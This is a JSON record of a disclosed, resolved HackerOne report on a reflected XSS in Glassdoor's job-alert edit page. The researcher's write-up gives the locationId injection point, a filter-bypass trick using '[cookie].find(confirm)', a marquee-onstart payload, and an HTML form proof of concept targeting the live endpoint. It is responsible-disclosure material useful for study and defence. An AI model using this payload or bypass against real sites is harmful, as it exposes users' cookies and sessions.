@@ -1,0 +1,144 @@
+{
+  "id": 838910,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84Mzg5MTA=",
+  "url": "https://hackerone.com/reports/838910",
+  "title": "[XSS] Reflected XSS via POST request in (editJobAlert.htm) file",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-04-04T16:02:43.409Z",
+  "submitted_at": "2020-04-04T16:02:43.409Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "flex0geek",
+    "url": "/flex0geek",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/dv3ydksa2wo1nyqstlxw4dsqc8sq/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 204,
+    "url": "https://hackerone.com/glassdoor",
+    "handle": "glassdoor",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/u258rsub76htn189l6jc17ycwrc4/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/u258rsub76htn189l6jc17ycwrc4/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Glassdoor",
+      "twitter_handle": "glassdoor",
+      "website": "https://www.glassdoor.com/",
+      "about": "Your work people are here"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-04-16T02:36:05.698Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-05-29T12:41:59.196Z",
+  "team_member_agreed_on_going_public_at": "2021-04-16T02:36:05.574Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Description:\n\nfirst, it was a very good bug for me it starts when I was testing the form for I found a CSRF I sent it here #838778 I tested the form again and after few minutes I found that this parameter `locationId` in the post request is vulnerable to XSS the page take the value of this parameter and add it to `a` tag here\n```\n<a href='/Job/jobs.htm?sc.keyword=&locId=3438985'>\n```\ni added this value `flex0'` and I could get out of the `href` attribute so I closed the tag too using `>` and now i start my journey to found a valid payload which can work with this filter I tried a looooooot of payloads it takes me hours to bypass the filter block this values `alert, confirm, write, prompt` if there is any value after it i tried a lot of encoding to bypass it but nothing works with me so i start to think out of the box and search on google too and I got this one `[0].find(confirm)` this value is equal to `confirm(0)` so it can work and there is nothing blocked on this value so I added my payload here\n```\n'><marquee onstart=\"[cookie].find(confirm)\">\n```\nthis payload will pop up with the cookies of the victim now because it was in a POST request I used it with an HTML code here\n```html\n<form action=\"https://www.glassdoor.com/profile/editJobAlert.htm\" method=\"post\">\n    <input type=\"text\" name=\"setupJobAlertEmail\" value=\"false\"><br>\n    <input type=\"text\" name=\"userValidationKey\" value=\"\"><br>\n    <input type=\"text\" name=\"key\" value=\"\"><br>\n    <input type=\"text\" name=\"jobAlertId\" value=\"[the id of the jobalert]\"><br>\n    <input type=\"text\" name=\"JAK\" value=\"\"><br>\n    <input type=\"text\" name=\"reactivation\" value=\"false\"><br>\n    <input type=\"text\" name=\"linkOrigin\" value=\"\"><br>\n    <input type=\"text\" name=\"keywords\" value=\"[the name]\"><br>\n    <input type=\"text\" name=\"rawLocationName\" value=\"Cairo\"><br>\n    <input type=\"text\" name=\"locationType\" value=\"C\"><br>\n    <input type=\"text\" name=\"locationId\" value=\"3438985\"><br>\n    <input type=\"text\" name=\"emailFrequency\" value=\"WEEKLY\"><br>\n    <input type=\"submit\" value=\"send\">\n</form>\n```\nthe payload will be added in the `locationId` parameter in this code notice that we can make the form send the request automaticly without any interaction from the user but in my POC I didn't use that because I changed the value a lot to prove the bug in the Video POC is involve the coockies and the domain name and a value too so i can use it as Full XSS the Vidoe is here\n\n{F773437}\n\n### Steps:\n\n1. take the value and add to HTML file and add your payload in `locationId`\n2. open this file in your browser and send the request\n3. you will see that the payload works and the pop-up happened\n\n\n### Fix:\n\nyou should add a function to encode the value of this parameter with HTML encode like other parameters\n\n## Impact\n\nI can execute JS code on the websites's users.",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 773437,
+      "file_name": "xss_poc.wmv",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/t93XfkS3j7AhiYTgLst18Lpa?response-content-disposition=attachment%3B%20filename%3D%22xss_poc.wmv%22%3B%20filename%2A%3DUTF-8%27%27xss_poc.wmv&response-content-type=video%2Fx-ms-wmv&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX7T3DB4I%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T231658Z&X-Amz-Expires=2241&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDBX6iSzaFyfvzFBbW%2BGR%2FbsiUdRGS2ZFlDPnz%2FzdvBIAIhAMkk2NKpZXyT4sf%2BkzyB8mv5zVRy51CGaZ5rhrUtG9F8KroFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgyleY3yfrYFv8CwslgqjgUcarpVSwKq6L3q1FQNWjWPoFOsd7DtpB8P75iLY9Ndz%2Bl0TJTy%2FPtXppzIFKgsB74HwuG9V8I%2BB0ql%2FT5Efif2TP0lL%2BLSwYPu1iH%2BCMBYitS6FbPeeZCHxXGIP7qLklsYEbNrP5TnBfjNyAvUCFo0rvsQlbRTV5imgTy2RC59HsPadkYS0m9qbT4BpGP%2FfSpMXvkd5Ypmfwq8LSUlDL%2BvHlKRQi%2B3XkUd80q6eG1Af1col5%2FV9df6v2I%2Be%2FaRVV8lYx1iI%2BdwJSupnd4AzAJXbxPMGIG%2BIUTmXmkeQLrOC95V0Jh17sy1Kk4%2FJjMdIXb7MZAn9TlhlsL1Izy7VwPpzLStTNSY4UQ1d3DqQNhiIu%2FXeqcgqJntEKp6Ed1%2F1rB4XGEldWdhdOsY9w1A7SaKcSIkksewNNiHMAfflenIJ39Wi%2BXyWpXO2UGmuRy3zjkp28DjKgl%2FUJBKFhKClqOGS1CrfrBsEdfYqV1dNCpEJ%2FxZjVeVsyMYHgfgzoo3hp4E%2BVgGKKFtg0uzwLGP23fMfpgj%2BYxbUZNM1VEMUOfkIwRD536Jz8an62zAD%2FZeGs2JQ86aBg5OwVKPRflKyBGi8d%2FRn9X1M92uKzzF4%2BYRRiitumnMFmAf9MSGk%2BkVcMhX5PxqIx5S6y6M%2Fg2DZgzQKKwaYmWOerc%2FYDWYeqPYQbXySJaAQjMGg3i5bM3ZK4YGfCDVzxiplySsUPHUcppahytQkWyqvV%2FZO09z%2F3aeNTdalp3DuiMbKfKSQADpAyZg7vY9Swy4k3%2BQKi9TeefvHroZxAZTYWSepxrv7PlZ3rffrme3kRmPL4%2Bxcrb3kJqaMTXVLASYvekxhl3LXIpjwzDYDpdFDI2TNXDSz3YwmbvizAY6sAEeq828T%2FEuqwfGilgVyCOWvJhvVOuJFIHgfI24UuSLmWGnMTFxzS1lJcV9Izp6xVpq%2Bs%2BX2ycNlSdtweuqmey65nNkAS9bb53v9dmn8SxxZCCEA8kph2cwqDWhQYhaJRLS4pVOaDV%2FnQCJ8gj2RqAGWwdbXLvPic8fEIc%2FdXNISWWBwrYvtuYd06H%2BpeOWRCikAOWNtGROiXSsGD4WgmSskq9closLgvwiQLQ72HCISg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9966d735b656154c0c884be293987d1e202481d46503e0d732e275ac568b8348",
+      "file_size": 2213150,
+      "type": "video/x-ms-wmv",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-06-28T12:41:59.255Z",
+  "allow_singular_disclosure_after": -178281299.2360642,
+  "singular_disclosure_allowed": true,
+  "vote_count": 38,
+  "voters": [
+    "echidonut",
+    "ath3na",
+    "abdoubouanik",
+    "sgt_",
+    "loaymorad",
+    "battle_angel",
+    "mattberg",
+    "ali",
+    "tess",
+    "dnelsaka",
+    "and 28 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.4,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 8181,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "https://www.glassdoor.com/*",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
